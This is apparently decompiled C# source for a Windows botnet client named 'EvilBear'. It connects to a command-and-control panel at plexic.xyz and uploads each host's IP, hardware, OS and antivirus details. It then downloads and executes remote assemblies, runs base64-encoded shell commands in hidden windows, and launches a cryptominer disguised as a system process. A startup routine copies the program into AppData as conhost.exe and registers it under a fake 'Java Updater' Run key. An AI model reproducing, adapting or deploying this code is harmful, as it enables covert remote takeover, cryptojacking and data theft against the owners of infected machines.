using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace EvilBear;

internal class Program
{
	private class HClient : WebClient
	{
		public HClient()
		{
			base.Proxy = null;
		}
	}

	public static string website;

	public static string website2;

	private static Mutex mutex;

	private static bool swap;

	public const bool startup = false;

	public const Environment.SpecialFolder store = Environment.SpecialFolder.ApplicationData;

	private static string hwid;

	private static string lastmin;

	static Program()
	{
		website = "http://plexic.xyz/panel/";
		website2 = "";
		mutex = new Mutex(initiallyOwned: false, "RYNXIFJY");
		swap = false;
		if (!mutex.WaitOne(0, exitContext: false))
		{
			Exit();
		}
		CCritical.Enable();
	}

	[DllImport("kernel32.dll")]
	private static extern bool GetPhysicallyInstalledSystemMemory(out long MemoryInKilobytes);

	private static void Exit()
	{
		Environment.Exit(0);
	}

	public static bool PingHost(string nameOrAddress)
	{
		try
		{
			new WebClient().DownloadData(nameOrAddress);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static void CheckHost()
	{
		if (!PingHost(website))
		{
			string text = website;
			website = website2;
			website2 = text;
			swap = true;
		}
		else if (swap && !PingHost(website2))
		{
			string text2 = website2;
			website2 = website;
			website = text2;
			swap = false;
		}
	}

	private static void Main(string[] args)
	{
		try
		{
			CheckHost();
			Init();
			while (true)
			{
				CheckMiner();
				string text = new HClient().DownloadString(website + "bot/do.php?hwid=" + hwid);
				Process.GetProcessesByName("WmiPvers");
				if (text != "")
				{
					string[] array = text.Split();
					switch (array[1])
					{
					default:
						Execute(website + "out/bin/" + array[1] + ".bin", array[0], string.Join(" ", (string[])new List<IEnumerable>(array).GetRange(2, array.Length - 2).ToArray()));
						break;
					case "cmd":
						new Thread(cmd).Start(new string[2]
						{
							array[0],
							array[2]
						});
						break;
					case "visit":
						if (array[3] != "0")
						{
							Process.Start(array[2]);
						}
						else
						{
							new HClient().DownloadData(array[2]);
						}
						Success(array[0]);
						break;
					case "exec":
						Execute(array[2], array[0], "");
						break;
					}
				}
				Thread.Sleep(new Random().Next(10000, 20000));
			}
		}
		catch (Exception)
		{
			Thread.Sleep(20000);
			Main(args);
		}
	}

	private static void cmd(object ts)
	{
		string[] obj = (string[])ts;
		string task = obj[0];
		string s = obj[1];
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C " + Encoding.UTF8.GetString(Convert.FromBase64String(s)),
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		})!.WaitForExit();
		Success(task);
	}

	private static void Init()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_012e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_01a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		string text = "";
		string text2 = "";
		string text3 = "Unknown";
		string text4 = "Windows";
		GetPhysicallyInstalledSystemMemory(out var MemoryInKilobytes);
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
		try
		{
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					text4 = enumerator.get_Current().get_Item("Caption").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		ManagementObjectSearcher val2 = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
		try
		{
			ManagementObjectEnumerator enumerator = val2.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					hwid = enumerator.get_Current().get_Item("ProcessorId").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		ManagementObjectSearcher val3 = new ManagementObjectSearcher("select Name from Win32_Processor");
		try
		{
			ManagementObjectEnumerator enumerator = val3.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					text = enumerator.get_Current().get_Item("Name").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val3)?.Dispose();
		}
		ManagementObjectSearcher val4 = new ManagementObjectSearcher("SELECT Description FROM Win32_DisplayConfiguration");
		try
		{
			ManagementObjectEnumerator enumerator = val4.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					text2 = enumerator.get_Current().get_Item("Description").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val4)?.Dispose();
		}
		ManagementObjectSearcher val5 = ((Environment.OSVersion.Version.Major > 5) ? new ManagementObjectSearcher(Environment.MachineName + "\\root\\SecurityCenter2", "SELECT displayName FROM AntivirusProduct") : new ManagementObjectSearcher(Environment.MachineName + "\\root\\SecurityCenter", "SELECT displayName FROM AntivirusProduct"));
		try
		{
			ManagementObjectEnumerator enumerator = val5.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					text3 = enumerator.get_Current().get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val5)?.Dispose();
		}
		new HClient().DownloadString(website + "bot/check.php?hwid=" + hwid + "&ip=" + new HClient().DownloadString("http://checkip.amazonaws.com").Trim() + "&os=" + text4 + "&name=" + Environment.MachineName + "&ram=" + MemoryInKilobytes / 1024L / 1024L + "&cpu=" + text + "&gpu=" + text2 + "&av=" + text3);
	}

	private static void Execute(string exe, string task, string args)
	{
		new Thread(exec).Start(new string[3] { exe, task, args });
	}

	private static void exec(object ts)
	{
		string[] obj = (string[])ts;
		string address = obj[0];
		string text = obj[1];
		string text2 = obj[2];
		try
		{
			string text3 = Environment.TickCount + ".bin";
			new HClient().DownloadFile(address, text3);
			AppDomain appDomain = AppDomain.CreateDomain(text3);
			appDomain.ExecuteAssembly(text3, (Evidence)null, text2.Split());
			AppDomain.Unload(appDomain);
			GC.Collect();
			File.Delete(text3);
		}
		catch (Exception)
		{
		}
		finally
		{
			if (text != "")
			{
				Success(text);
			}
		}
	}

	private static void Success(string task)
	{
		new HClient().DownloadString(website + "bot/do.php?hwid=" + hwid + "&completed=" + task);
	}

	private static void CheckMiner()
	{
		string text = new HClient().DownloadString(website + "bot/miner.php?check=1");
		string text2 = new HClient().DownloadString(website + "bot/miner.php");
		Process[] processesByName = Process.GetProcessesByName("WmiPvers");
		if (text == "1" && processesByName.Length < 1)
		{
			lastmin = text2;
			Execute(website + "out/bin/miner.bin", "", text2 + " " + website);
		}
		else if ((text == "0" || lastmin != text2) && processesByName.Length != 0)
		{
			processesByName[0].Kill();
		}
	}

	private static void RegStartup()
	{
		string location = Assembly.GetEntryAssembly()!.Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text = folderPath + "\\conhost.exe";
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Java Updater", text);
		if (!location.Contains(folderPath))
		{
			File.Copy(location, text);
			Process.Start(new ProcessStartInfo
			{
				Arguments = (("/C TIMEOUT /T 2 & del " + location + " & TIMEOUT /T 2 & " + text) ?? ""),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Exit();
		}
	}
}
